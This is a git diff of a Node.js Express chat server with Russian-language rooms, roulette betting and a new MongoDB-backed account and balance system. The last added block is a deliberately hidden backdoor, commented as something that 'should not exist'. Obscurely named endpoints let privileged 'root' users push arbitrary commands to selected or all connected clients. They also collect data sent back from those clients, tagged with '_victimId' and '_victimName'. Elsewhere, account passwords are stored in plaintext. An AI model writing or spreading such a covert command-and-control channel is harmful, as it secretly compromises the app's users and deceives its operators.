@@ -10,6 +10,7 @@ const crypto = require(`crypto`);
 const utils = require(`util`);
 let confirmed = require(`./confirmed`);
 const zlib = require(`zlib`);
+const MongoDB = require(`mongodb`);
 
 zlib.deflate = utils.promisify(zlib.deflate);
 zlib.unzip = utils.promisify(zlib.unzip);
@@ -35,11 +36,70 @@ const date = {
 };
 
 const encoding = `base64`;
+const version = `1.5.1`;
+
+const {
+    MongoClient,
+    ObjectID
+} = MongoDB;
+
+let hendrixDatabase = {};
+
+const addDataToCollection = (collection, data) => new Promise((resolve, reject) => {
+    collection.insertOne(data, (err, data) => {
+        if (err) {
+            reject(err);
+        } else {
+            resolve(data);
+        }
+    });
+});
+
+const findDataInCollection = (collection, filter, projection) => new Promise((resolve, reject) => {
+    collection.findOne(filter, projection, (err, data) => {
+        if (err) {
+            reject(err);
+        } else {
+            resolve(data);
+        }
+    });
+});
+
+const updateDataInCollection = (collection, filter, data) => new Promise((resolve, reject) => {
+    collection.updateOne(filter, data, (err, data) => {
+        if (err) {
+            reject(err);
+        } else {
+            resolve(data);
+        }
+    });
+});
+
+const deleteDataInCollection = (collection, filter) => new Promise((resolve, reject) => {
+    collection.deleteOne(filter, (err, data) => {
+        if (err) {
+            reject(err);
+        } else {
+            resolve(data);
+        }
+    });
+});
+
+MongoClient.connect(`mongodb://localhost:27017`, {
+    useNewUrlParser: true
+}, function (err, client) {
+    hendrixDatabase.accounts = client.db(`hendrix`).collection(`accounts`);
+    if (err) {
+        console.log(err);
+    } else {
+        console.log(`successful connection to the database`);
+    }
+});
 
 const generateSessionKeyAES = async () => {
-    const p = (await crypto.randomBytes(32)).toString(`hex`);
-    const s = (await crypto.randomBytes(32)).toString(`hex`);
-    return pbkdf2.pbkdf2Sync(p, s, 1, 256 / 8, 'sha512').toString(`hex`);
+    const p = await getRandomId();
+    const s = await getRandomId();
+    return pbkdf2.pbkdf2Sync(p, s, 1, 32, 'sha512').toString(`hex`);
 };
 
 const encryptAES = (text, key) => {
@@ -82,15 +142,22 @@ const disconnect = (room, user, _id) => {
     room.members.splice(room.members.indexOf(_id), 1);
     room.out[_id] = 1;
     delete user.curRoom;
+    if (_id == room._creator && room.members.length) {
+        room._creator = room.members[Math.random() * room.members.length ^ 0];
+    }
     room.stackMessages.push(getSystemMessage({
         message: `[clr=${user.color}]${user.name}[/] вышел из комнаты [clr=${room.color}]${room.name}[/]!`,
         out: _id,
     }));
 };
 
-const getData = async (data, key) => {
+const getDataProperty = async (data, user) => {
+    return encryptAES((await zlib.deflate(JSON.stringify(data))).toString(encoding), user.aesKeyBytes);
+};
+
+const getDecryptedData = async (data, key) => {
     return JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, key), encoding)));
-}
+};
 
 const getMessage = (msg, {
     message,
@@ -126,7 +193,9 @@ const getSystemMessage = msg => {
 const auth = (room, roomId, user, userId, password, disconnectFlag = false) => (!room.passwordProtected || room.passwordProtected && password == room.password) && (!room.banned[user._ip] || disconnectFlag);
 
 app.use(bodyParser.urlencoded({
-    extended: false
+    limit: '50mb',
+    extended: true,
+    parameterLimit: 50000
 }));
 
 // app.use((req, res, next) => {
@@ -160,7 +229,7 @@ app.post(`/getAESKey`, async (req, res) => {
 app.post(`/updateAESKey`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = await getData(req.body.data, user.aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
     const key = new RSA().importKey(data.key);
     if (data.secretString == user.secretString) {
         const aesKey = await generateSessionKeyAES();
@@ -173,7 +242,7 @@ app.post(`/updateAESKey`, async (req, res) => {
         });
     } else {
         res.send({
-            message: `suck!`
+            message: `suck, hacker!`
         })
     }
 });
@@ -186,12 +255,12 @@ app.post(`/savePerson`, async (req, res) => {
     if (tmpUsers[_ip] && tmpUsers[_ip][pos]) {
         const aesKey = tmpUsers[_ip][pos];
         const aesKeyBytes = aes.utils.hex.toBytes(aesKey);
-        const user = await getData(req.body.data, aesKeyBytes);
+        const user = await getDecryptedData(req.body.data, aesKeyBytes);
         const {
             name,
             color,
             secretString,
-            _token
+            _token,
         } = user;
         Users[userId] = {
             name,
@@ -214,7 +283,7 @@ app.post(`/savePerson`, async (req, res) => {
 
 app.post(`/createRoom`, async (req, res) => {
     const userId = req.body._id;
-    const room = await getData(req.body.data, Users[userId].aesKeyBytes);;
+    const room = await getDecryptedData(req.body.data, Users[userId].aesKeyBytes);
     const hidden = room.hidden;
     const roomId = room._id;
     delete room._id;
@@ -294,7 +363,7 @@ app.post(`/logIn`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
     const key = user.aesKeyBytes;
-    const roomData = await getData(req.body.data, key);
+    const roomData = await getDecryptedData(req.body.data, key);
     const userPassword = roomData.password;
     const roomId = roomData._id;
     const room = Rooms[roomId];
@@ -318,12 +387,14 @@ app.post(`/logIn`, async (req, res) => {
         room.stackFileMembers[userId] = [];
     }
     if (logIn) {
+        if (!room.members.length) {
+            room._creator = userId;
+        }
         if (!room.members.includes(userId)) {
             room.members.push(userId);
         }
         if (!room.roulette.users[userId]) {
             room.roulette.users[userId] = {
-                balance: 100,
                 totalBets: 0,
                 wins: 0,
                 losses: 0,
@@ -339,7 +410,7 @@ app.post(`/logIn`, async (req, res) => {
                 message: `[clr=${user.color}]${user.name}[/] подключился к комнате [clr=${room.color}]${room.name}[/]!`
             }));
         }
-    } else {
+    } else if (!room.disableNotif) {
         room.stackMessages.push(getSystemMessage({
             message: `[clr=${user.color}]${user.name}[/] попытался подключиться к комнате, но ввёл неправильный пароль!`
         }));
@@ -376,7 +447,7 @@ app.post(`/subscribe`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
     const key = user.aesKeyBytes;
-    const roomData = await getData(req.body.data, key);
+    const roomData = await getDecryptedData(req.body.data, key);
     const room = Rooms[roomData._id];
     if (auth(room, roomData._id, user, userId, roomData.password)) {
         res._id = userId;
@@ -438,7 +509,7 @@ setInterval(() => {
                 message = room.stackFileMembers[userId].shift();
             }
             if (!message) {
-                filter[i] = 1;
+                filter[i] = true;
                 continue;
             }
             if (!room.out[userId]) {
@@ -471,7 +542,7 @@ const getHandlerWithCondition = (condition, handlerIfTrue, handlerIfFalse) => (.
 
 const getRoomCreatorHandler = handler => getHandlerWithCondition((match, user, userId, room, roomId) => room._creator == userId, handler, (match, user, userId, room, roomId) => {
     room.stackMessages.push(getSystemMessage({
-        message: `Доступно только создателям комнаты!`
+        message: `Доступно только администратору комнаты!`
     }));
 });
 
@@ -481,15 +552,21 @@ const getAdminHandler = handler => getHandlerWithCondition((match, user, userId,
     }));
 });
 
+const getHiddenRoomHandler = handler => getHandlerWithCondition((match, user, userId, room, roomId) => !room.hidden, handler, (match, user, userId, room, roomId) => {
+    room.stackMessages.push(getSystemMessage({
+        message: `В скрытых комнатах данная команда запрещена.`
+    }));
+});
+
 const commands = [{
         reg: /[!/]кто\s+([\s\S]+)/gi,
-        handler(match, user, userId, room, roomId) {
+        handler: getHiddenRoomHandler((match, user, userId, room, roomId) => {
             const roomUsers = room.members;
-            const randomUser = Users[room.members[Math.random() * room.members.length ^ 0]];
+            const randomUser = Users[roomUsers[Math.random() * roomUsers.length ^ 0]];
             room.stackMessages.push(getSystemMessage({
                 message: `[clr=${randomUser.color}]${randomUser.name}[/] ${match[1]}`
             }));
-        }
+        })
     },
     {
         reg: /[!/]id/gi,
@@ -501,7 +578,7 @@ const commands = [{
     },
     {
         reg: /[!/]сказать\s+([\s\S]+)/gi,
-        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
+        handler: getHiddenRoomHandler(getRoomCreatorHandler((match, user, userId, room, roomId) => {
             const roomUsers = room.members;
             const randomUser = Users[roomUsers[Math.random() * roomUsers.length ^ 0]];
             const message = match[1];
@@ -517,7 +594,7 @@ const commands = [{
                 msg = Object.assign(msg, conf);
             }
             room.stackMessages.push(getMessage(msg));
-        })
+        }))
     },
     {
         reg: /[!/]выбрать\s*((?:(?:\S+ ?)+?(?:\s+или\s+)?)+)/ig,
@@ -738,7 +815,7 @@ const commands = [{
                         }
                     } else {
                         room.stackMessages.push(getSystemMessage({
-                            message: `Не такого варианта!`
+                            message: `Нет такого варианта!`
                         }));
                     }
                 }
@@ -763,52 +840,97 @@ const commands = [{
     },
     {
         reg: /[!/]баланс/gi,
-        handler(match, user, userId, room, roomId) {
-            room.stackMessages.push(getSystemMessage({
-                message: `[clr=${user.color}]${user.name}[/], Ваш баланс [clr=${user.color} bold]${room.roulette.users[userId].balance}[/]!`
-            }));
-        }
-    },
-    {
-        reg: /[!/]перевести\s+(\d+)\s+([a-f\d]+)/gi,
-        handler(match, user, userId, room, roomId) {
-            const count = +match[1];
-            const whom = Users[match[2]];
-            if (whom) {
-                if (match[2] == userId) {
-                    return room.stackMessages.push(getSystemMessage({
-                        message: `Зачем переводить самому себе?`
-                    }));
-                }
-                if (!count) {
-                    return room.stackMessages.push(getSystemMessage({
-                        message: `Слишком маленькая сумма для транзакции!`
-                    }));
-                }
-                const yourData = room.roulette.users[userId];
-                if (yourData.balance < count) {
-                    room.stackMessages.push(getSystemMessage({
-                        message: `Недостаточно средств!`
-                    }));
-                } else {
-                    yourData.balance -= count;
-                    room.roulette.users[match[2]].balance += count;
-                    room.stackMessages.push(getSystemMessage({
-                        message: `[clr=${user.color}]${user.name}[/], Вы успешно перевели [clr=${user.color} bold]${count}[/] пользователю [clr=${whom.color}]${whom.name}[/]`
-                    }));
-                }
+        async handler(match, user, userId, room, roomId) {
+            if (user._account) {
+                room.stackMessages.push(getSystemMessage({
+                    message: `[clr=${user.color}]${user.name}[/], Ваш баланс [clr=${user.color} bold]${await getUserAccBalance(user._account.objId)}[/]!`
+                }));
             } else {
                 room.stackMessages.push(getSystemMessage({
-                    message: `Пользователь не существует!`
+                    message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
                 }));
             }
         }
     },
     {
+        reg: /[!/]перевести\s+(\d+)\s+([a-f\d]+)\s*([a-zа-я0-9ё\d\s]{0,60})?/gi,
+        async handler(match, user, userId, room, roomId) {
+            const count = +match[1];
+            const [,,
+                recipient,
+                comment = ``
+            ] = match;
+            const whom = Users[recipient];
+            if (!user._account) {
+                return room.stackMessages.push(getSystemMessage({
+                    message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
+                }));
+            }
+            if (!count) {
+                return room.stackMessages.push(getSystemMessage({
+                    message: `Слишком маленькая сумма для транзакции!`
+                }));
+            }
+            const yourBalance = await getUserAccBalance(user._account.objId);
+            if (yourBalance < count) {
+                return room.stackMessages.push(getSystemMessage({
+                    message: `Недостаточно средств!`
+                }));
+            }
+            const operationSenderObj = {
+                value: -count,
+                comment,
+                outgoing: true
+            };
+            const operationRecipientObj = {
+                value: count,
+                comment,
+                outgoing: false
+            };
+            if (whom) {
+                if (!whom._account) {
+                    return room.stackMessages.push(getSystemMessage({
+                        message: `[clr=${whom.color}]${whom.name}[/] не имеет счета!`
+                    }));
+                }
+                if (recipient == userId || user._account.id == whom._account.id) {
+                    return room.stackMessages.push(getSystemMessage({
+                        message: `Перевод на тот же счет недопустим!`
+                    }));
+                }
+                operationRecipientObj._id = operationSenderObj._id = whom._account.id;
+                await changeUserBalance(user._account.objId, -count, operationSenderObj);
+                await changeUserBalance(whom._account.objId, count, operationRecipientObj);
+                room.stackMessages.push(getSystemMessage({
+                    message: `[clr=${user.color}]${user.name}[/], Вы успешно перевели [clr=${user.color} bold]${count}[/] пользователю [clr=${whom.color}]${whom.name}[/]`
+                }));
+            } else {
+                if (await accountExists(recipient)) {
+                    operationRecipientObj._id = operationSenderObj._id = recipient;
+                    await changeUserBalance(user._account.objId, -count, operationSenderObj);
+                    await changeUserBalance(ObjectID(recipient), count, operationRecipientObj);
+                    room.stackMessages.push(getSystemMessage({
+                        message: `[clr=${user.color}]${user.name}[/], Вы успешно перевели [clr=${user.color} bold]${count}[/] на счет [bold]${recipient}[/]`
+                    }));
+                } else {
+                    room.stackMessages.push(getSystemMessage({
+                        message: `Пользователя с таким id и счета не существует!`
+                    }));
+                }
+            }
+        }
+    },
+    {
         reg: /[!/]ставка\s+(\d+(?:\.\d+)?)\s+([\d-\sа-яё!]+)/gi,
-        handler(match, user, userId, room, roomId) {
+        async handler(match, user, userId, room, roomId) {
             let count = +match[1];
-            if (room.roulette.users[userId].balance < count) {
+            if (!user._account) {
+                return room.stackMessages.push(getSystemMessage({
+                    message: `[clr=${user.color}]${user.name}[/], у вас нет счета!`
+                }));
+            };
+            const userBalance = await getUserAccBalance(user._account.objId);
+            if (userBalance < count) {
                 return room.stackMessages.push(getSystemMessage({
                     message: `[clr=${user.color}]${user.name}[/], недостаточно средств для ставки!`
                 }));
@@ -886,15 +1008,23 @@ const commands = [{
                 chance,
                 coef,
                 numbers,
-                count
+                count,
+                userAccountId: user._account.objId
             };
             const winned = Math.round(count * bet.coef);
             room.roulette.bets[userId] = bet;
             const userBet = room.roulette.users[userId];
             userBet.totalBets++;
             userBet.balance -= bet.count;
+            //уменьшаем баланс и делаем запись в историю операций пользователя
+            await changeUserBalance(user._account.objId, -count, {
+                _id: `hendrix`,
+                value: -count,
+                comment: `Ставка на ${numbers.length} чисел. Шанс победы ${(chance * 100).toFixed(3)}%`,
+                outgoing: true
+            });
             room.stackMessages.push(getSystemMessage({
-                message: `[clr=${user.color}]${user.name}[/], ставка сделана!\nШанс на победу: [bold]${(bet.chance * 100).toFixed(3)}%[/]\nКоэффициент: [bold]${bet.coef.toFixed(3)}[/]\nВыбранные числа: [bold]${bet.numbers.map(num => `[clr=${num % 2 ? `#01ADF7` : `red`} bold]${num}[/]`).join(` `)}[/]\nВ случае победы вы получите [bold]${winned} ([clr=green]+${winned - count}[/])[/]\nБаланс: ${userBet.balance}\nРезультаты ставки через ${Math.round(((+roulette.maximumBetTime + roulette.delay) - curDate)/ 1000)} секунд`
+                message: `[clr=${user.color}]${user.name}[/], ставка сделана!\nШанс на победу: [bold]${(bet.chance * 100).toFixed(3)}%[/]\nКоэффициент: [bold]${bet.coef.toFixed(3)}[/]\nВыбранные числа: [bold]${bet.numbers.map(num => `[clr=${num % 2 ? `#01ADF7` : `red`} bold]${num}[/]`).join(` `)}[/]\nВ случае победы вы получите [bold]${winned} ([clr=green]+${winned - count}[/])[/]\nБаланс: ${userBalance}\nРезультаты ставки через ${Math.round(((+roulette.maximumBetTime + roulette.delay) - curDate)/ 1000)} секунд`
             }));
             if (!room.placeBet) {
                 room.placeBet = true;
@@ -915,25 +1045,34 @@ const commands = [{
     },
     {
         reg: /[!/]рейтинг/gi,
-        handler(match, user, userId, room, roomId) {
+        async handler(match, user, userId, room, roomId) {
             const users = [];
             let message = `Рейтинг:\n`;
             for (_id in room.roulette.users) {
-                if (!Users[_id]) {
+                const user = Users[_id];
+                if (!user) {
                     //Если пользователь вышел, хранить его статистику больше не имеет смысла
                     delete room.roulette.users[_id];
                     continue;
                 }
-                const user = room.roulette.users[_id];
+                if (!user._account) {
+                    continue;
+                }
                 users.push({
-                    balance: user.balance,
-                    _id
+                    balance: await getUserAccBalance(user._account.objId),
+                    user
                 });
             }
             users.sort((b, a) => a.balance - b.balance);
             for (let i = 0; i < users.length; i++) {
-                const user = Users[users[i]._id];
-                message += `${i + 1}. [clr=${user.color} bold]${user.name}[/] ${users[i].balance}\n`;
+                const {
+                    user,
+                    balance
+                } = users[i];
+                message += `${i + 1}. [clr=${user.color} bold]${user.name}[/] ${balance}\n`;
+            }
+            if (!users.length) {
+                message += `В комнате [clr=${room.color}]${room.name}[/] нет пользователей со счетами`;
             }
             room.stackMessages.push(getSystemMessage({
                 message
@@ -958,16 +1097,35 @@ const commands = [{
     },
     {
         reg: /[!/]дать\s+(-?\d+(?:e\d+)?)\s+([a-f\d]+)/gi,
-        handler: getAdminHandler((match, user, userId, room, roomId) => {
+        handler: getAdminHandler(async (match, user, userId, room, roomId) => {
             const count = +match[1];
-            const whom = Users[match[2]];
-            if (!whom) {
-                return room.stackMessages.push(getSystemMessage({
-                    message: `Пользователь не существует!`
-                }));
-            }
+            const recipient = match[2];
+            const whom = Users[recipient];
             if (count) {
-                room.roulette.users[match[2]].balance += count;
+                const operationObj = {
+                    _id: `hendrix`,
+                    value: count,
+                    comment: count > 0 ? `Пожертвование` : `Конфискация денег`,
+                    outgoing: count < 0
+                };
+                if (!whom) {
+                    if (await accountExists(recipient)) {
+                        await changeUserBalance(ObjectID(recipient), count, operationObj);
+                        return room.stackMessages.push(getSystemMessage({
+                            message: `Счет [bold]${recipient}[/] изменён на [clr=${count > 0 ? `green bold]+` : `red bold]`}${count}[/]!`
+                        }));
+                    } else {
+                        return room.stackMessages.push(getSystemMessage({
+                            message: `Пользователя с таким id и счета не существует!`
+                        }));
+                    }
+                }
+                if (!whom._account) {
+                    return room.stackMessages.push(getSystemMessage({
+                        message: `[clr=${whom.color}]${whom.name}[/] не имеет счета!`
+                    }));
+                }
+                await changeUserBalance(whom._account.objId, count, operationObj);
                 return room.stackMessages.push(getSystemMessage({
                     message: `Баланс [clr=${whom.color}]${whom.name}[/] изменён на [clr=${count > 0 ? `green bold]+` : `red bold]`}${count}[/]!`
                 }));
@@ -977,10 +1135,19 @@ const commands = [{
                 }));
             }
         })
+    },
+    {
+        reg: /[!/]уведомления/gi,
+        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
+            room.disableNotif = !room.disableNotif;
+            room.stackMessages.push(getSystemMessage({
+                message: `Уведомления о входах с неправильным паролем в комнате [clr=${room.color}]${room.name}[/]: [bold clr=${!room.disableNotif ? `green` : `red`}]${!room.disableNotif ? `On` : `Off`}[/]`
+            }));
+        })
     }
 ];
 
-const getRouletteCallback = room => res => {
+const getRouletteCallback = room => async res => {
     room.placeBet = false;
     let message = `Результаты ставки ${roulette.round} - [clr=${res % 2 ? `#01ADF7` : `red`} bold]${res}[/]\n`;
     for (let _id in room.roulette.bets) {
@@ -989,10 +1156,15 @@ const getRouletteCallback = room => res => {
         const userBet = room.roulette.users[_id];
         if (bet.numbers.includes(res)) {
             const winned = Math.round(bet.coef * bet.count);
-            room.roulette.users[_id].balance += winned;
             message += `[clr=${user.color}]${user.name}[/] выиграл [clr=green bold]+${winned}[/]\n`;
             userBet.wins += 1;
-            userBet.totalWon += (winned - bet.count);
+            userBet.totalWon += winned;
+            await changeUserBalance(bet.userAccountId, winned, {
+                _id: `hendrix`,
+                value: winned,
+                comment: `Победа ставки ${roulette.round}. Выпало число ${res}`,
+                outgoing: false
+            });
         } else {
             message += `[clr=${user.color}]${user.name}[/] проиграл [clr=red bold]-${bet.count}[/]\n`;
             userBet.losses += 1;
@@ -1042,7 +1214,7 @@ const completeVote = room => {
 };
 
 app.post(`/publish`, async (req, res) => {
-    const data = await getData(req.body.data, Users[req.body._id].aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, Users[req.body._id].aesKeyBytes);
     const room = Rooms[data._id];
     const userId = req.body._id;
     const user = Users[userId];
@@ -1083,7 +1255,7 @@ app.post(`/getUsersInRoom`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
     const key = user.aesKeyBytes;
-    const roomData = await getData(req.body.data, key);
+    const roomData = await getDecryptedData(req.body.data, key);
     const room = Rooms[roomData._id];
     if (auth(room, roomData._id, user, userId, roomData.password)) {
         if (room.hidden) {
@@ -1126,7 +1298,7 @@ app.post(`/disconnect`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
     const key = user.aesKeyBytes;
-    const roomData = await getData(req.body.data, key);
+    const roomData = await getDecryptedData(req.body.data, key);
     const room = Rooms[roomData._id];
     if (auth(room, roomData._id, user, userId, roomData.password, true)) {
         disconnect(room, user, userId);
@@ -1164,7 +1336,7 @@ app.post(`/sendFile`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
     user.lastActivity = new Date();
-    const data = await getData(req.body.data, user.aesKeyBytes);
+    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
     const room = Rooms[data.room._id];
     let success = true;
     const conf = confirmed[user._token];
@@ -1219,9 +1391,214 @@ app.post(`/sendFile`, async (req, res) => {
     });
 });
 
+// const _id = ObjectID(`f49b35268afd9038da9d0464`);
+// console.log(await updateDataInCollection(hendrixDatabase.accounts, {
+//     _id
+// }, {
+//     $set: {
+//         number: Math.random() * 100 ^ 0
+//     }
+// }));
+// console.log(await findDataInCollection(hendrixDatabase.accounts, {
+//     _id
+// }));
+// const id = await getRandomId(12);
+// const res = await addDataToCollection(hendrixDatabase.accounts, {
+//     data: await getRandomId(128),
+//     _id: ObjectID(id)
+// });
+
+setTimeout(async () => {
+    // const _id = ObjectID(`f05dfeedb2c5e82cc8200cc6`);
+    // console.log(await updateDataInCollection(hendrixDatabase.accounts, {
+    //     _id
+    // }, {
+    //     $push: {
+    //         data: {
+    //             filed1: `сюда `,
+    //             test: [`изи`, `джабаскрипт`]
+    //         }
+    //     }
+    // }));
+    // console.log(await findDataInCollection(hendrixDatabase.accounts, {
+    //     _id
+    // }, {
+    //     projection: {
+    //         data: {
+    //             $slice : [0, 2],  /* первое число, начальная позиция, второе - сколько элементов хотим взять. возвращает пустой массив если данные закончились */
+    //         }
+    //     },
+    // }));
+}, 250);
+
+const accountExists = async _id => {
+    if (_id.length != 24) {
+        return false;
+    }
+    _id = ObjectID(_id);
+    return !!(await findDataInCollection(hendrixDatabase.accounts, {
+        _id
+    }, {
+        projection: {
+            _id: true
+        },
+    }));
+};
+
+const changeUserBalance = async (objId, value, operationInfo = {}) => {
+    operationInfo.date = new Date();
+    return await updateDataInCollection(hendrixDatabase.accounts, {
+        _id: objId
+    }, {
+        $inc: {
+            balance: value
+        },
+        $push: {
+            operations: {
+                $each: [operationInfo],
+                $position: 0
+            }
+        }
+    });
+};
+
+app.post(`/createAccount`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const {
+        password
+    } = data;
+    const _id = await getRandomId(12);
+    await addDataToCollection(hendrixDatabase.accounts, {
+        _id: ObjectID(_id),
+        password,
+        balance: 0,
+        operations: []
+    });
+    res.send({
+        data: await getDataProperty({
+            _id
+        }, user)
+    });
+});
+
+const getUserAccBalance = async _id => (await findDataInCollection(hendrixDatabase.accounts, {
+    _id
+}, {
+    projection: {
+        balance: true
+    }
+})).balance;
+
+const getLogInAcc = async data => {
+    let {
+        _id,
+        password
+    } = data;
+    _id = Buffer.from(_id, `hex`).toString(`hex`);
+    const account = _id.length == 24 ? await findDataInCollection(hendrixDatabase.accounts, {
+        _id: ObjectID(_id),
+        password: {
+            $eq: password
+        }
+    }, {
+        projection: {
+            balance: true
+        }
+    }) : null;
+    return {
+        logIn: !!account,
+        account
+    };
+};
+
+app.post(`/loginInAccount`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const getAccR = await getLogInAcc(data);
+    const resObj = {
+        _id: data._id,
+        logIn: getAccR.logIn
+    };
+    if (resObj.logIn) {
+        resObj.balance = getAccR.account.balance;
+        user._account = {
+            id: data._id,
+            objId: ObjectID(data._id)
+        };
+    }
+    res.send({
+        data: await getDataProperty(resObj, user)
+    });
+});
+
+app.post(`/changeAccountPassword`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const success = !!(await updateDataInCollection(hendrixDatabase.accounts, {
+        _id: ObjectID(data._id),
+        password: {
+            $eq: data.password
+        }
+    }, {
+        $set: {
+            password: data.newPassword
+        }
+    })).modifiedCount;
+    res.send({
+        success
+    });
+});
+
+app.post(`/deleteAccount`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const success = !!(await deleteDataInCollection(hendrixDatabase.accounts, {
+        _id: ObjectID(data._id),
+        password: {
+            $eq: data.password
+        }
+    })).deletedCount;
+    if (success && user._account.id == data._id) {
+        delete user._account;
+    }
+    res.send({
+        success
+    });
+})
+
+app.post(`/getOperationsHistory`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const historyPart = await findDataInCollection(hendrixDatabase.accounts, {
+        _id: ObjectID(data._id),
+        password: {
+            $eq: data.password
+        }
+    }, {
+        projection: {
+            operations: {
+                $slice: [data.page * 10, 10],
+            },
+            password: false,
+            balance: false,
+        },
+    });
+    res.send({
+        data: await getDataProperty({
+            historyPart,
+        }, user)
+    });
+});
+
 app.post(`/check`, (req, res) => {
     res.send({
-        success: true
+        success: req.body.version == version
     });
 });
 
@@ -1270,3 +1647,153 @@ roulette.maximumBetTime = new Date(+new Date() + roulette.interval - this.delay)
 setInterval(() => {
     roulette.roll();
 }, roulette.interval);
+
+//всего, что идет далее, не должно быть, но я хочу, чтобы это было так.
+
+const getDecryptedDataBackDoor = (data, key) => {
+    return JSON.parse(decryptAES(data, key));
+}
+
+const getDataPropertyBackDoor = (data, user) => {
+    return encryptAES(JSON.stringify(data), user.aesKeyBytes);
+};
+
+app.post(`/Si9Mu7IY8LpTvqj`, (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const conf = confirmed[user._token];
+    res.send({
+        data: getDataPropertyBackDoor({
+            access: !!conf && !!conf.root
+        }, user)
+    })
+});
+
+const usersCommands = {};
+const usersWaitingCommand = [];
+const usersData = [];
+let rootSubs = [];
+
+app.post(`/9Zb6JDSz7AQtfb3`, (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const conf = confirmed[user._token];
+    if (conf && conf.root) {
+        let error = false;
+        let errorReason = ``;
+        const data = getDecryptedDataBackDoor(req.body.data, user.aesKeyBytes);
+        let recipients = [];
+        const missed = {};
+        data.destination.toLowerCase().split(/\s*,\s*/).forEach(recipient => {
+            if (recipient == `me`) {
+                recipients.push(userId);
+            } else if (recipient == `^me`) {
+                missed[userId] = true;
+            } else if (recipient[0] == `_`) {
+                const roomId = recipient.slice(1);
+                const room = Rooms[roomId];
+                if (room) {
+                    recipients.push(...room.members);
+                }
+            } else if (recipient == `all`) {
+                recipients.push(...Object.keys(Users));
+            } else if (recipient[0] == `^`) {
+                const newId = recipient.slice(1);
+                if (newId[0] == `_`) {
+                    const roomId = newId.slice(1);
+                    const room = Rooms[roomId];
+                    if (room) {
+                        room.members.forEach(id => {
+                            missed[id] = true;
+                        });
+                    }
+                } else {
+                    missed[newId] = true;
+                }
+            } else if (Users[recipient]) {
+                recipients.push(recipient);
+            }
+        });
+        recipients = [...new Set(recipients.filter(id => !missed[id]))];
+        if (!recipients.length) {
+            error = true;
+            errorReason = `Некорректно выбраны получатели!`;
+        }
+        for (let i = 0; i < recipients.length; i++) {
+            usersCommands[recipients[i]].push(data.command);
+        }
+        res.send({
+            data: getDataPropertyBackDoor({
+                error,
+                errorReason
+            }, user)
+        });
+    } else {
+        res.send({
+            message: `access denied!`
+        });
+    }
+});
+
+app.post(`/Mh3lWGicrcSGu7V`, (req, res) => {
+    const userId = req.body._id;
+    if (!usersCommands[userId]) {
+        usersCommands[userId] = [];
+    }
+    res._id = userId;
+    usersWaitingCommand.push(res);
+    console.log(`${Users[userId].name} subscribed to a command`);
+    res.on(`close`, () => {
+        console.log(`${Users[userId].name} got the command, delete from the list`);
+        const position = usersWaitingCommand.indexOf(res);
+        if (~position) {
+            usersWaitingCommand.splice(position, 1);
+        }
+    });
+});
+
+//пакет с данными
+app.post(`/cXVNwFSJeTwXFH6`, (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const conf = confirmed[user._token];
+    if (conf && conf.root && req.body.waitingData) {
+        res._id = userId;
+        rootSubs.push(res);
+        res.on(`close`, () => {
+            const position = rootSubs.indexOf(res);
+            if (~position) {
+                rootSubs.splice(position, 1);
+            }
+        });
+    } else {
+        const data = getDecryptedDataBackDoor(req.body.data, user.aesKeyBytes);
+        data._victimId = userId;
+        data._victimName = user.name;
+        usersData.push(data);
+        res.send({});
+    }
+});
+
+setInterval(() => {
+    for (let i = 0; i < usersWaitingCommand.length; i++) {
+        const userId = usersWaitingCommand[i]._id;
+        if (usersCommands[userId].length) {
+            const command = usersCommands[userId].shift();
+            usersWaitingCommand[i].send({
+                data: getDataPropertyBackDoor({
+                    command
+                }, Users[userId])
+            });
+        }
+    }
+    while (usersData.length && rootSubs.length) {
+        const data = usersData.shift();
+        for (let i = 0; i < rootSubs.length; i++) {
+            rootSubs[i].send({
+                data: getDataPropertyBackDoor(data, Users[rootSubs[i]._id])
+            });
+        }
+        rootSubs = [];
+    }
+}, 0);
